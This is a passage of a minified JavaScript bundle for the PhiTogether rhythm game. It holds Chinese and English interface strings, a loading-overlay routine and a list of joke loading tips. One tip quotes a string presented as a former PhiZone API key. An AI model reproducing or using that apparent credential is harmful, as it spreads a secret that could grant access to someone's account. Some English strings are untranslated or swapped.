账号（{username}）绑定吗？",bindingTapTap:"正在绑定 TapTap",bindTapTapSuccess:"绑定 TapTap 成功",bindTapTapFailure:"绑定 TapTap 失败，请确保 PhiZone 账号与 TapTap 账号一对一绑定"},multiplayer:{liveRanking:"实时排名",connection:{error:"连接联机服务器失败，正在重试",wsRec:"联机服务器连接断开，重连中...",reconnected:"已成功重连至联机服务器",forcedBroken:"服务器强制关闭了您的连接请求，这可能是因为服务器维护或版本更新，您无法继续多人游戏。您的多人游戏将被强制退出。",sendDataFailed:"尝试发送 {action} 数据失败"},downloadPlayBack:{roomClosed:"无法下载已关闭房间的游玩回放",noAccess:"您没有权限下载游玩回放"},downloadAllPlayBack:{confirm:"您确定要下载所有游玩回放吗？",done:"已完成所有游玩回放的下载"},wrappedSinglePlayBack:{confirm:"您确定要下载此条游玩回放吗？"},downloadSinglePlayBack:{cheating:"无法下载：{player}在第{round}轮游戏中可能存在作弊行为，游玩记录无效"},tips:{afterCreated:{roomOwner:"您可以在多人面板中查看玩家信息，确认后可以锁定该房间并开始游戏。",player:"等待房主{0}开始游戏...（您可以在联机面板中查看玩家信息）"},selectChart:{roomOwner:"请选择谱面并同步给房间成员。",player:"房主正在选择谱面中，请耐心等待。"},loadingChart:"正在加载谱面，游戏即将开始！",waitingForOthers:"等待其他玩家完成游戏并上传成绩...",chartLoaded:"正在加载谱面，游戏即将开始！",thisRoundIsOver:"本轮游戏结束，您可以查看成绩统计。",becameRoomOwner:"您已成为新房主",locked:"房间玩家锁定，游戏即将开始。在多人游戏中，您可以点击标题中绿色的 Together 字样打开联机面板。",waitingToStart:"等待游戏开始...",scoreAllUploaded:"所有玩家已完成分数上传，您可以查看成绩统计。10秒后跳转成绩统计。",nextRoundStarted:{roomOwner:"下一轮游戏已开始，请选择谱面载入后点击同步。",player:"下一轮游戏已开始，房主正在选择谱面中，请耐心等待。"},exitRankFull:"您可以通过点击 PhiTogether 标题或logo退出全屏统计展示。"},recoverMultiFailed:"尝试恢复未正常退出的多人游戏失败，如需开启新的多人游戏请重新点击多人游戏按钮。",doCreateRoom:{shareInfo:"【PhiTogether】我创建了一个联机房间，复制本条消息并打开 {0}//{1}，点击多人游戏按钮并粘贴本条消息来和我一起联机！$$${2}$$$",copyShareInfoConfirm:"分享信息如下，点击确定来复制到剪贴板。<br>{shareInfo}",copyShareInfo:"复制分享信息",autoCopyFailed:"自动复制失败，请长按下方文字手动复制！<br>{shareInfo}",failed:"创建房间失败，请重试"},joinRoom:{failed:"加入房间失败，请重试"},actionPlayer:{confirm:"您要操作玩家 {name} 吗？",askForAction:"您要对玩家 {name} 执行什么操作？",actions:{kickPlayer:"踢出",transferOwnerShip:"转移房主"},error_competeMode:"您无法在比赛模式下转让房主。"},exitRoom:{error_competeMode:"您无法在比赛模式下退出房间。",exited:"您已退出游戏！"},lockRoom:{locking:"锁定房间中",locked:"房间已经锁定，请选择谱面并点击同步！",err:"错误，请重试"},sendMsg:{cantBeEmpty:"消息不得为空",success:"发送成功",failed:"发送失败，请重试"},roomClosed:"房间已关闭",cantFindChartLocally:"未在您的本地谱面库中找到 {0} 的谱面 {1}，请上传指定谱面后继续",multiWaitLoadChart:"正在等待所有人完成加载...",failed_tryAfter3Sec:"失败，3秒后重试",uploadFailed_tryAfter3Sec:"上传失败，3秒后重试",gameStartedWarning:{body:"游戏已经开始，请准备好点击确定立即开始！",title:"游戏开始",chartStillLoading:"抱歉，谱面仍在加载中，请稍后重试。"},waitToStartGame:"谱面已同步，请耐心等待其他玩家完成加载。",gameStartUI:{title:"游戏可以开始！",body:"所有玩家已经完成谱面加载，在您点击下方按钮后将为所有玩家启动游戏。",start:"开始"},panels:{messages:{title:"信息",messagesList:"信息列表",msgInputPlaceholder:"消息内容...",send:"发送"},playerList:{title:"玩家列表"},roundRank:{title:"成绩（按歌曲）"},playerRank:{title:"成绩（按玩家）",my:"我 ({0}) 的游戏记录",others:"{0} 的游戏记录"},rank:{genVer:"v{verStr} 生成于",totalRanking:"综合排名"}},operations:"操作",multiActions:{switchToRankByAcc:"切换到依据Acc排名",switchToRankByScore:"切换到依据分数排名",rankedByAcc:"依据Acc排名",rankedByScore:"依据分数排名",nextTrack:"下一首歌",lockRoom:"锁定房间并开始",closeRoom:"关闭房间",exitRoom:"退出房间",rankFull:"全屏展示成绩统计",downloadAllPlayBack:"下载全部游玩回放",backToSingle:"回到单人游戏"}},playerB20:{loadB20:"正在加载数据...",error:"加载数据时遇到错误"},replayPage:{title:"播放游玩回放",description:"请在下方选择您要播放的游玩回放文件。请注意，若该谱面为本地谱面，则该回放对应的本地谱面必须在您的谱面库中。",recordFile:"回放文件",play:"播放"},userChartEdit:{title:"修改谱面信息",askToFillWithUK:"您未填写完所有信息，要将未填写信息全部使用“unknown”代替吗？",success:"修改成功",error:"修改出错",songName:"曲名",composer:"曲师",illustrator:"画师",charter:"谱师",level:"等级",difficulty:"定数",save:"保存"},userChartUpload:{title:"上传本地谱面",description:{line0:"请点击【加载本地文件】按钮选择本地谱面添加到 PhiTogether（一个 zip 内只能含有一个谱面文件，若有额外资源，请先选择额外资源再上传谱面本体包）。",line1:"在一般情况下，PhiTogether会自动完成谱面的添加。",line2:"如果无法自动填充信息，您可能需要手动填写信息后点击下方【添加入库】按钮添加。",line3:"如果您选择了错误的文件，请点击【重置填写】按钮。"},target:"您需要上传的谱面为 {0} {1} {2} by {3}（谱面md5：{4}）请确保上传正确谱面。",extraRes:"额外资源",add:"添加入库",clear:"重置填写",success:"添加成功！",fileDoesntMatch:"您上传的文件 {0} 与要求上传的谱面 {1} 不符，请更换文件后重试。",chartAdded:"此谱面已添加",saving:"正在保存谱面",err:{haveMultipleCharts:"错误：不支持同时导入多张谱面",noChartSelected:"错误：未选择任何谱面",noSongSelected:"错误：未选择任何音乐",noImageSelected:"错误：未选择任何图片"}},config:{dbUpgraded:"由于数据库结构更新,您的数据可能被暂时清空"},loadChart:{info:"正在下载文件：{loaded}/{resNum}",failed:"加载失败",loading:"正在加载谱面",failedFromPZRedirect:"加载谱面失败，若要重新游玩，可在 PhiTogether 中重新登录您的 PhiZone 账户。",simphiLoading:"正在加载资源"},requestFullscreen:{requestDownloadiOSApp:"检测到您使用的是苹果设备，可能无法正常进行游戏，您是否要安装 PhiTogether iOS APP 获得更好体验？",unsupported:"您的设备或浏览器不支持 PhiTogether 进入全屏模式，您的游戏体验可能受到影响",requestFullscreen:"PhiTogether 需要在全屏状态下运行，请点击下方按钮使 PhiTogether 全屏，如果您取消全屏可能会遇到问题。",clickToFullscreen:"点击全屏"},requestLandscape:{requestLandscape:"为了保证游戏体验，请横置屏幕",toggleFullScrOption:"全屏并横屏"},update:{newVersionNotify:"将从本地版本 v{0} 更新到最新版本 v{1}，用时最长可能达一分钟，现在更新吗？",autoUpdateCheckFailed:"自动更新检查失败"},askPermission:{notification:{msg:"您是否同意 PhiTogether 在后台给您推送通知？（我们只使用此权限推送多人游戏最新动态）",err:"您拒绝了通知请求或您的设备不支持后台通知，PhiTogether 将无法在后台通知您多人游戏的最新信息。"}},askForReload:{msg:"PhiTogether 需要重新加载当前页面才能应用该调整。",title:"即将重载页面",yes:"立即重载",no:"稍后手动重载"},phizone:{scoreUpload:{getToken:"正在上报 PhiZone 游玩配置",getTokenErr:"错误：无法与服务器通讯",uploading:"正在上传成绩",failed:"成绩上传失败，是否重试？"},modJudgment:{offline:"您无法在离线模式下修改判定范围",current:"您当前的设置为：Perfect±{0} Good±{1}，您要修改吗？",enterPJ:"请输入新的Perfect判定范围（±25~±100 整数 单位: ms）",enterGJ:"请输入新的Good判定范围（±60~±180 整数 单位: ms）",inputDosentMatchRequirement:"输入不符合要求",error:"操作配置文件出错",success:"判定范围修改成功",modfying:"修改配置文件中..."},login:{autologinFailed:"自动登录失败，您已进入离线模式。您可以正常离线游玩，但所有记录将不会被保存。若要重新上线，请尝试刷新页面或重新登录。",updatingUserInfo:"正在更新用户信息",success:"{userName}，欢迎登入 PhiTogether！",autologgingin:"正在自动登录到PhiZone"},err:{retriveToken:{invalidPswd:"密码错误",unableToFindUser:"用户名错误"},unknown:"未知错误"}},respack:{customResApplied:"自定义资源包应用成功",requestReload:"切换 PhiTogether 资源包预设需要刷新页面生效，现在刷新页面吗？",err:"自定义资源设置有误",unavaliableNow:"prpr自定义资源包暂不可用（马上修）"},simphi:{compatibilityWarning:{miBrowser:"检测到小米浏览器且版本低于17.4，可能存在切后台声音消失的问题"},loadLib:{err:{msg1:"错误：{name}组件加载失败（点击查看详情）",msg2:"{name}组件加载失败，请检查您的网络连接然后重试：",msg3:"{name}组件加载失败，请检查浏览器兼容性"},libNames:{createImageBitmap:"ImageBitmap兼容",oggmentedBundle:"ogg格式兼容",webp:"webp格式兼容"}},handleFile:{unsupportedFile:"不支持的文件：{0}",loadingFile:"正在加载文件：{uploader_done}/{uploader_total}"},loading:{imgLoadingError:"检测到图片加载异常，请关闭所有应用程序然后重试",resLoadFailed1:"错误：{0}个资源加载失败（点击查看不了详情）",resLoadFailed2:`资源加载失败，请检查您的网络连接然后重试：
{0}`},prprCustomRes:{applied:"自定义资源包应用完成",err:"错误：无法应用自定义资源包，界面显示可能异常，请检查设置"},adjustOffset:{title:"延迟调整",reset:"恢复",save:"保存"},playErr:{noChartSelected:"错误：未选择任何谱面",noMusicSelected:"错误：未选择任何音乐",judgeLineDoesentExist:"指定id的判定线不存在：{0}",imageDoesentExist:"图片不存在：{0}"}},skin:{haveCommon:"已有同名资源包,是否继续导入",saved:"资源包保存成功"}},en_US={info:{info:"Info",cancel:"Cancel",confirm:"OK",mod:"Modify",error:"Error",switchRespackReloadConfirm:"Switching PhiTogether resource pack presets requires a reload. Proceed now? ",customRespackAppliedSuccessfully:"Successfully apploed custom resource pack. "},pages:{"/startpage":"Start Page","/chartselect":"Chart Selection","/playing":"Gameplay","/login":"Log in via PhiZone","/calibrate":"Calibration","/cachemanage":"Cache Manager","/aboutpage":"About","/chartupload":"Chart Uploader","/chartedit":"Info Editor","/playerb20":"Player B20","/pzranksingle":"???","/replaypage":"Replays","/changelogs":"Changelogs","/multipanel":"MP Panel","/settings":"Settings","/loading":"Loading","/multiindex":"MP Lobby"},startPage:{viewB20:"View B20",retryLogin:"Retry Logging in",switch:"Switch",logout:"Log out",login:"Log in",unLogined:"GUEST",singleGame:"Singleplayer",multiGame:"Multiplayer",caches:"Caches",replay:"Replay",gameSettings:"Game Settings",forcedFullscreen:"Forced Fullscreen",about:"About",serviceStatus:"Status",updateLogs:"Changelogs",redirectToCustomURL:"Insert custom sim-phi URL",logoutConfirm:"Are you sure you want to log out? ",logoutSuccessfully:"You are logged out and entering offline mode. ",offlineNotice:"Only local charts are availbale due to a lack of Internet connection. ",askForLogin:"All gameplay data WILL NOT be saved in offline mode. Would you like to log in? ",askForRelogin:"All gameplay data WILL NOT be saved in offline mode. Would you like to log in? ",offlineMPNotice:"An Internet connection is required for multiplayer sessions.",noaccountmodeMPNotice:"You are not (properly) logged in. Please try again after a relogin. ",loadingUserConfig:"Loading user preferences...",judgeRangeMPNotice:"Please set your custom judgement to Perfect±80ms Good±160ms. ",fullscreenjudgeMPNotice:"Please disable full-screen judgement before a multiplayer session. ",errLoadingUserConfig:"Error fetching user preferences. ",restoreMP:"We've detected that you've disconnected from an ongoing multiplayer session. Would you like to reconnect? ",recoverMP:"Reconnecting",recoverMPFailed:"Failed to reconnect. Please tap the multiplayer button to start a new session. ",recoverMPNetProblem:"Failed to reconnect due to network issue. Retry by tapping the multiplayer button. ",mpMaintainanceNotice:"Multiplayer is under maintainance. "},multiIndex:{join:"Join a Room",create:"Create a Room",roomId:"Room ID",goPublic:"Public Room",description:"Room Description",roomId_cannot_be_empty:"Room ID must not be empty",loadRoomInfo:"Loading room info",owner:"Room Owner",roomListEmpty:"Room Not Found",roomFull:"Room is Full",roomLocked:"Room is Locked",byId:"by ID",byRks:"by rks",byPlayerNumber:"by Players",search:"Search",refresh:"Refresh",avgRks:"Avg. rks",err:"Failed to execute",joining:"Validating user info and connecting to server",roomIdCantContainsDollar:'"$" is forbidden in Room IDs.'},aboutPage:{life:"Been running for {0} days since launch",QQGuild:"QQ Channel: PhiTogether233",bio:"PhiTogether is an <b> uncommercial</b> rythm game based on Phigros with PhiZone integrated",supportUs:"Support us if you enjoy the game! ",relationshipWithPG:"The game has NO relation to Pigeon Games (Xiamen) Co. Ltd",roles:{projectCreator:"Creator",developers:"Developers",soundDesigner:"Sound FX Artists",visualEffects:"VFX Artist",communityManager:"Community Moderators",gameArtist:"Texture Artists"},realtvop:{isTheWorst:"is the worst"},thanksToOther:"We express thanks to all players and co-creators who had helped us develop the game! ",externalLinks:"Friendly Links",sponsors:"Sponsors"},cacheManage:{deletedSuccessfully:"Deleted successfully",confirmBeforeDeleteData:"Are you sure you want to delete it? ",confirmBeforeDelete:"Are you sure you want to delete it? ",delete:"Delete",allDataDeleted:"PhiTogether has removed all game data stored on your device. Please quit PhiTogether and restart the game. ",separate:"Miscellaneous",cachedFileTitle:"Caches for {0}",deleteThisGroupOfFiles:"Delete All",file:"File",type:"Type",operation:"Operations",music:"Music",illustration:"Illustration",chart:"Chart",additionRes:"Extras"},calibrate:{title:"Offset Settings",description1:"Hit the button on every downbeat. ",description2:"The result is only for reference. Different input methods may result in different offsets. ",click:"Hit",start:"Start",loadFile:"Loading calibration audio...",loadSuccess:"Successfully loaded calibration audio. ",loadError:"Failed to load calibration audio. ",decodeError:"Failed to decode calibration audio. ",confirm:"Would you like to set the offset to {c}？"},changelogs:{title:"Changelogs"},chartSelect:{jumpto:"Insert your destination page (1 - {0})",inputDosentMatchRequirement:"Invalid input",favourites:{add:"Favourite",addedSuccessfully:"Added {0} to favourites",remove:"Unfavourite",removedSuccessfully:"Removed {0} from favourites"},multiSyncChart:{sync:"Syncing chart",failed:"Failed to sync chart"},songSource:{local:"Imports",favourites:"Fav-ed",pz:"&nbsp;PhiZone&nbsp;",pt:"&nbsp;PT Com.&nbsp;"},search:"Search by name",import:"Import",chartListIsEmpty:"No charts available",pageCount:"Page {page} / {pageAll} in all",playConfig:{mirror:"Mirror",adjustOffset:"Adjust Offset",previewMode:"Preview Mode",practiseMode:"Practice Mode",videoRecorder:"Record Video",speed:"Speed",speeds:{slowest:"Slowest",slower:"Slower",normal:"Normal",faster:"Faster",fastest:"Fastest"}},previewLoadFailed:"Failed to load preview audio. ",loadingChartList:"Loading Chart List",loadingChapterList:"Loading Chapter List",loadFailed:"Failed to Load",pgmChartNote:"This chart is a Phigrim Original. Please refer to Phigrim for more info. ",unableToSelectDueToCopyrightReasons:"Sorry, the chart is unavailable for copyright issues. ",loadingChart:"Downloading Chart",edit:"Edit",delete:"Delete",select:"Play",rankings:"Ranking",thisSongHasNoPlayableCharts:"No chart is available for this song. ",chartSelect:"Chart Selection",config:"Gameplay Config"},loadingPage:{loadingRes:"Loading Resources"},login:{usernameAndPasswordCantBeEmpty:"Empty value detected",loggingin:"Logging In",email:"Email",passwd:"Password",signin:"Login",signup:"Sign Up"},multiplayer:{liveRanking:"Real-Time Ranking",connection:{error:"Failed to connect. Retrying",wsRec:"Disconnected from the server. Reconnecting...",reconnected:"Reconnected to the server. ",forcedBroken:"The server closed your connection due to a maintainence. Your multiplayer session has been aborted. ",sendDataFailed:"The attempt to send {action} has failed"},downloadPlayBack:{roomClosed:"Replays from a closed room can't be downloaded",noAccess:"You are not authorized to download the replay"},downloadAllPlayBack:{confirm:"Are you sure you want to download ALL replays? ",done:"Download completed"},wrappedSinglePlayBack:{confirm:"Are you sure you want to download this replay? "},downloadSinglePlayBack:{cheating:"Failed to download：Player {player} may have cheated in Round {round}. This replay has been invalidated. "},tips:{afterCreated:{roomOwner:"Player info is provided in the multiplayer panel. Once you are ready, you may lock the room and start the game. ",player:"Waiting for {0} to start the game..."},selectChart:{roomOwner:"Please choose a chart so it gets synced among all players. ",player:"The room owner is now choosing a chart. Please wait patiently"},loadingChart:"Loading the chart. The game is about to start! ",waitingForOthers:"Awaiting stats upload for all players...",chartLoaded:"Chart loaded. Starting game...",thisRoundIsOver:"Round over. You may check the statistics. ",becameRoomOwner:"You've become the new room owner. ",locked:"房间玩家锁定，游戏即将开始。在多人游戏中，您可以点击标题中绿色的 Together 字样打开联机面板。",waitingToStart:"等待游戏开始...",scoreAllUploaded:"所有玩家已完成分数上传，您可以查看成绩统计。10秒后跳转成绩统计。",nextRoundStarted:{roomOwner:"下一轮游戏已开始，请选择谱面载入后点击同步。",player:"下一轮游戏已开始，房主正在选择谱面中，请耐心等待。"},exitRankFull:"您可以通过点击 PhiTogether 标题或logo退出全屏统计展示。"},recoverMultiFailed:"尝试恢复未正常退出的多人游戏失败，如需开启新的多人游戏请重新点击多人游戏按钮。",doCreateRoom:{shareInfo:"【PhiTogether】我创建了一个联机房间，复制本条消息并打开 {0}//{1}，点击多人游戏按钮并粘贴本条消息来和我一起联机！$$${2}$$$",copyShareInfoConfirm:"分享信息如下，点击确定来复制到剪贴板。<br>{shareInfo}",copyShareInfo:"复制分享信息",autoCopyFailed:"自动复制失败，请长按下方文字手动复制！<br>{shareInfo}",failed:"创建房间失败，请重试"},joinRoom:{failed:"加入房间失败，请重试"},actionPlayer:{confirm:"您要操作玩家 {name} 吗？",askForAction:"您要对玩家 {name} 执行什么操作？",actions:{kickPlayer:"踢出",transferOwnerShip:"转移房主"},error_competeMode:"您无法在比赛模式下转让房主。"},exitRoom:{error_competeMode:"您无法在比赛模式下退出房间。",exited:"您已退出游戏！"},lockRoom:{locking:"锁定房间中",locked:"房间已经锁定，请选择谱面并点击同步！",err:"错误，请重试"},sendMsg:{cantBeEmpty:"消息不得为空",success:"发送成功",failed:"发送失败，请重试"},roomClosed:"房间已关闭",cantFindChartLocally:"未在您的本地谱面库中找到 {0} 的谱面 {1}，请上传指定谱面后继续",multiWaitLoadChart:"正在等待所有人完成加载...",failed_tryAfter3Sec:"失败，3秒后重试",uploadFailed_tryAfter3Sec:"上传失败，3秒后重试",gameStartedWarning:{body:"游戏已经开始，请准备好点击确定立即开始！",title:"游戏开始",chartStillLoading:"抱歉，谱面仍在加载中，请稍后重试。"},waitToStartGame:"谱面已同步，请耐心等待其他玩家完成加载。",gameStartUI:{title:"游戏可以开始！",body:"所有玩家已经完成谱面加载，在您点击下方按钮后将为所有玩家启动游戏。",start:"开始"},panels:{messages:{title:"信息",messagesList:"信息列表",msgInputPlaceholder:"消息内容...",send:"发送"},playerList:{title:"玩家列表"},roundRank:{title:"成绩（按歌曲）"},playerRank:{title:"成绩（按玩家）",my:"我 ({0}) 的游戏记录",others:"{0} 的游戏记录"},rank:{genVer:"v{verStr} 生成于",totalRanking:"综合排名"}},operations:"操作",multiActions:{switchToRankByAcc:"切换到使用Acc排名",switchToRankByScore:"切换到使用分数排名",nextTrack:"下一首歌",lockRoom:"锁定房间并开始",closeRoom:"关闭房间",exitRoom:"退出房间",rankFull:"全屏展示成绩统计",downloadAllPlayBack:"下载全部游玩回放",backToSingle:"回到单人游戏"}},playerB20:{loadB20:"Loading Data...",error:"We ran into an error when loading your data. "},replayPage:{title:"Replay",description:"Please upload your replay file. Be advised, the chart must be imported in advance if it was played via local imports. ",recordFile:"Replay File",play:"Play"},userChartEdit:{title:"Modify Chart Data",askToFillWithUK:'Some info has not been given. Would you like to replace them with "unknown"?',success:"Modification Success",error:"We ran into an error when trying to modify the info. ",songName:"Title",composer:"Composer",illustrator:"Illustrator",charter:"Charter",level:"Level",difficulty:"Difficulty",save:"Save"},userChartUpload:{title:"上传本地谱面",description:{line0:"Please click on [Load from Local File] button to import your chart to PhiTogether (One zip file must contain ONLY ONE chart file / Extra resources should be uploaded before you upload the chart. )",line1:"In common circumstances, PhiTogether will automatically complete the process of the import. ",line2:"You may have to insert chart info manually in case of incomplete info file. ",line3:"Please click on the [RESET] button if you accidentally chose the wrong file. "},target:"The chart you are about to upload is {0} {1} {2} by {3} (Chart md5：{4}) Please make sure you've got the correct chart. ",extraRes:"Extra Resources",add:"Add to Gallery",clear:"Reset",success:"Chart successfully imported",fileDoesntMatch:"The chart you've uploaded {0} is not identical to {1}. Please try another file or contact the room owner. ",chartAdded:"This chart has already been imported",err:{haveMultipleCharts:"Error: Multiple charts in one file is not supported",noChartSelected:"Error: Chart file not found",noSongSelected:"Error: Audio file not found",noImageSelected:"Error: Illustration file not found"}},config:{dbUpgraded:"You previous data may be deleted due to an upgrade in our database structure. "},loadChart:{info:"Downloading File: {loaded}/{resNum}",failed:"Failed to load",loading:"Loading Chart",failedFromPZRedirect:"Failed to load the chart. Please log in via PhiZone to retry. ",simphiLoading:"Loading Resources"},requestFullscreen:{requestDownloadiOSApp:"We've detected that you are using an Apple Device. Would you like to install PhiTogether App for a better experience? ",unsupported:"Your browser does not support fullscreen mode, which may affect your gameplay experience. ",requestFullscreen:"PhiTogether is best with fullscreen mode. Click the button below to enter fullscreen mode in case you run into any issues. ",clickToFullscreen:"Go Fullscreen"},requestLandscape:{requestLandscape:"Please rotate your screen to horizontal for a better experience. ",toggleFullScrOption:"Go Fullscreen and Horizontal"},update:{newVersionNotify:"The game is about to be updated from v{0} to v{1}, which may take no more than a minute. Would you like to update now? ",autoUpdateCheckFailed:"Failed to check for updates"},askPermission:{notification:{msg:"Request for notification feed has failed. PhiTogether won't be able to inform you of the latest info from multiplayer sessions. ",err:"Would you like to receive notifications about multiplayer session info when you are AFK? "}},askForReload:{msg:"PhiTogether have to reload for this change to take effect. ",title:"Reloading PhiTogether",yes:"Reload Now",no:"Later"},phizone:{scoreUpload:{getToken:"Uploading PhiZone Gameplay Config",getTokenErr:"Error: Unable to establish connection with the server",uploading:"Uploading Your Scores",failed:"Score upload has failed. Would you like to retry? "},modJudgment:{offline:"Judgement configs can't be modified in offline mode. ",current:"Your current settings are Perfect±{0}/Good±{1}. Would you like to modify it? ",enterPJ:"Please insert new Perfect judgement (±25~±100) Unit: ms",enterGJ:"Please insert new Good judgement (±60~±180) Unit: ms",inputDosentMatchRequirement:"Your input does not match the requirements. ",error:"Failed to modify the configuration. ",success:"Successfully modified the configuration",modfying:"Modifing the coniguration..."},login:{autologinFailed:"Failed to log in automatically Now entering offline mode. All gameplay data will not be saved until you retry logging in. ",updatingUserInfo:"Updating User Data",success:"Welcome to PhiTogether, {userName}!",autologgingin:"Automatically loggin in via PhiZone"},err:{retriveToken:{invalidPswd:"Incorrect password",unableToFindUser:"Incorrect username"},unknown:"Unknown error"}},respack:{customResApplied:"Successfully applied custom texture. ",requestReload:"Switching between PhiTogether texture presets requires a reload. Would you like to reload now? ",err:"Custom texture not set properly"},simphi:{compatibilityWarning:{miBrowser:"Mi Browser on version 17.4 or earlier has been detected. You may encounter issues on audio playback. "},loadLib:{err:{msg1:"Error: Failed to load component {name}",msg2:"Failed to load component {name}. Please check your network connection and restart the game. ",msg3:"Failed to load component {name}. Please check your browser compatibility. Updating your browser may help. "},libNames:{createImageBitmap:"ImageBitmap Compatibility",oggmentedBundle:"ogg Format Compatibiliby",webp:"webp Format Compatibiliby"}},handleFile:{unsupportedFile:"Unsupported file: {0}",loadingFile:"Loading file: {uploader_done}/{uploader_total}"},loading:{imgLoadingError:"We've detected that images may have not loaded properly. Please terminate all your background tasks and retry. ",resLoadFailed1:"Error: Failed to load {0} resources",resLoadFailed2:`Failed to load resource: 
{0}
Please check your Internet connection and retry. `},prprCustomRes:{applied:"Successfully applied custom resource pack. ",err:"Error: Unable to apply custom resouce pack. Please check your settings. "},offsetAdjust:{title:"Adjust Offset",reset:"Reset",save:"Save"},playErr:{noChartSelected:"Error: Chart file not found",noMusicSelected:"Error: Audio file not found",judgeLineDoesentExist:"Error: Judgement line #{0} does not exist",imageDoesentExist:"Error: Image {0} does not exist"}},skin:{haveCommon:"You may have already imported this resource pack. Would you like to procees? ",saved:"Successfully imported the resouce pack. "}};let locale="zh_CN";localStorage.getItem("ptlocale")?locale=localStorage.getItem("ptlocale"):localStorage.setItem("ptlocale",navigator.language.replace("-","_"));const messages={zh_CN,en_US},i18n=createI18n({locale,fallbackLocale:"zh_CN",messages}),ploading={currentId:null,lastOver:0,delayed:null,msg:"",tip:"喵喵喵~",canvas:null,ctx:null,startTime:0,showing:!1,zIndex:3,whenShow:()=>"喵喵喵",whenHide:()=>"喵喵喵",fadeInCompleted:!1,fadingOut:!1,useBlur:!0,PX_RATIO:window.devicePixelRatio||1,init(e){this.canvas=document.createElement("canvas"),this.ctx=this.canvas.getContext("2d"),this.canvas.width=window.innerWidth*this.PX_RATIO,this.canvas.height=window.innerHeight*this.PX_RATIO,this.canvas.style.width=`${window.innerWidth}px`,this.canvas.style.height=`${window.innerHeight}px`,this.ctx.scale(this.PX_RATIO,this.PX_RATIO),this.canvas.style=`z-index: ${this.zIndex}; backdrop-filter: blur(24px) brightness(.75); -webkit-backdrop-filter: blur(24px) brightness(.75); opacity: 1; position: fixed; left: 0px; top: 55px; cursor: progress;`,e&&(typeof e.whenShow=="function"&&(this.whenShow=e.whenShow),typeof e.whenHide=="function"&&(this.whenHide=e.whenHide))},refreshBlurState(){this.canvas.style=this.useBlur?`z-index: ${this.zIndex}; backdrop-filter: blur(24px) brightness(.75);-webkit-backdrop-filter: blur(24px) brightness(.75); opacity: 1; position: fixed; left: 0px; top: 55px; cursor: progress;`:`z-index: ${this.zIndex}; backdrop-filter: brightness(.5);-webkit-backdrop-filter: brightness(.5); opacity: 1; position: fixed; left: 0px; top: 55px; cursor: progress;`},l(e,t="default",n){if(this.currentId)this.show(e),this.currentId=t;else{let s=!1;this.zIndex=n?5:3,this.canvas.zIndex=this.zIndex;const r=()=>{s&&t!==this.delayed||(this.show(e,!0),this.currentId=t)};new Date().getTime()-this.lastOver<=500?(setTimeout(r,500),s=!0,this.delayed=t):(r(),this.delayed=null)}this.qwq()},r(e="default"){e===this.currentId&&(this.hide(),this.lastOver=new Date().getTime(),this.currentId=null),e===this.delayed&&(this.delayed=null)},show(e,t){this.msg=e,t&&(this.startTime=performance.now(),this.fadeInCompleted=!1),this.showing=!0,this.whenShow(),document.querySelector("div.main").appendChild(this.canvas)},hide(){this.fadingOut=performance.now(),this.fadeInCompleted=!1},resizeCanvas(){const{innerWidth:e,innerHeight:t}=window;this.canvas.width=e*this.PX_RATIO*.85,this.canvas.height=(t-55)*this.PX_RATIO*.85,this.canvas.style.width=e+"px",this.canvas.style.height=t-55+"px",this.ctx.scale(this.PX_RATIO,this.PX_RATIO)},qwq(){if(!ploading.showing||!ploading.canvas||!ploading.ctx)return;ploading.resizeCanvas();const e=ploading.canvas.height/ploading.PX_RATIO,t=ploading.canvas.width/ploading.PX_RATIO,n=performance.now(),s=(n-ploading.startTime)/15;ploading.ctx.font="35px Saira",ploading.ctx.textAlign="center",ploading.ctx.textBaseline="middle",ploading.ctx.fillStyle="#ffffff";const r=ploading.ctx.measureText(ploading.msg).width;if(ploading.ctx.clearRect(0,0,t,e),ploading.fadeInCompleted)ploading.canvas.style.opacity=1;else{const l=Math.tan(s/25);l>=0?ploading.canvas.style.opacity=l:ploading.fadeInCompleted=!0}if(ploading.fadingOut){const l=Math.cos((n-ploading.fadingOut)/400);l>=0?ploading.canvas.style.opacity=l:(ploading.fadingOut=!1,ploading.showing=!1,ploading.canvas.style.opacity=0,document.querySelector("div.main").removeChild(ploading.canvas),ploading.whenHide())}ploading.ctx.globalCompositeOperation="source-over",ploading.ctx.globalCompositeOperation="xor";const o=20+r/2;ploading.ctx.fillRect(Math.sin(s/20)<0?Math.cos(s/20)*o+t/2:t/2-o,e/2-25,-Math.cos(s/20)*o+o,50),ploading.ctx.fillText(ploading.msg,t/2,e/2),ploading.ctx.font="16px Saira",ploading.ctx.textAlign="center",ploading.ctx.textBaseline="bottom",ploading.ctx.fillText(ploading.tip,window.innerWidth*.85/2,e-40),requestAnimationFrame(ploading.qwq)}},tipsArray=["这是一条专属于2.0版本的Tip！","sudo mkdir astroxxx","玩家把官方未来要开发的东西都开发完了.jpg","别人是 PhiTogether，我是 FalseAlone","PhiTogether 的持续运行需要你的支持！快来关于页面的爱发电支持我们吧","你可以在 status.phitogether.fun 查看服务器状态","我知道加载很慢，但是你先别急","你 先 别 急.mp4","歪哎而抗姆 突 发哎突荄泽儿","数学作业 AT Lv.17","你说得对，但是 PhiTogether 是一款后面忘了","如果你的设备锁在 30 帧可能是开省电模式了","你说有没有一种可能，多人模式可以单人玩","听说你的 PhiZone API 密钥曾经是 2FcA9R67jZZpXZcPG","欢迎来 PT 的 Github 账号看我们堆出来的答辩","热知识：房间 ID 可以是任意字符，但是不能包含 $","救命写不出 Tips 了","正在重新连接到地球OL","Tip: Tip: Tip: Tip: Tip:","与 Phigrim 合作多人游戏可能性微存","const HairCount = 114514 - elapsedDayCount;","我删除了一点 PT 中的网页元素，这样你才知道你玩的其实是个游戏","苹果设备没声音？控制中心里小铃铛点一下!","玩久了记得让眼睛和手腕放松一下","我超，劲爆","www.皮在一起.fun","在披区里披合一并且皮在一起，多是一件美事","标准大气压下，直角90度，开水100度，那么开水是钝角","标准大气压下，开水100度，直角90度，那么直角没烧开","三倍!☆ ice cream!!★~","Are you ready! Yooooooooo—","这是什么？更新？阿巴阿巴……","当你在打PT的时候，一定在打PT吧！","大家好啊，今天给大家来点想看的东西","PhiTogether 服务器的运行成本在每个月 200r 左右","设置里可以选择另一个风格的结算背景音乐","设置里勾选 使用思源黑体 能使你找回熟悉的感觉(?","求求你们更新版浏览器","苹果设备老是弹出撤销怎么办，去辅助功能=>触控里关掉摇动以撤销就好啦！","使用PT在线资源包甚至可以自定义打击特效！","PhiTogether 是可以开启谱面镜像的！只需在点击播放前在谱面镜像处选择开启即可","单人游戏时双击左下角可以转板","function 有没有人能贡献一条比较好的Tip() { return 